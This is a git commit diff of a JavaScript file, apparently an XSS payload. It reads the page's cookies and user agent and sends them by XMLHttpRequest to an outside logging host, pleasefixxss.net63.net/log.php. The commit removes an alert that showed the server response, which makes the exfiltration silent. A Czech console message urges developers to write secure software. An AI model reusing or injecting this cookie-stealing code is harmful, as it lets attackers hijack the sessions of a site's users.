5bdd3c78b921bc9a074a4fa17e74bc4b9e290903
Testerino <honzaik@yahoo.com>
2014-04-17 00:23:18 +0200

    Update x.js
    oups

--- x.js
+++ x.js
@@ -3,11 +3,6 @@ var userAgent = navigator.userAgent;
 var params = "?cookies=" + cookies + "&agent=" + userAgent;
 var xhr = new XMLHttpRequest();
 
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4) {
-        alert(xhr.responseText);
-    }
-}
 xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
 xhr.send(null);
 console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpeční software. děkuji");
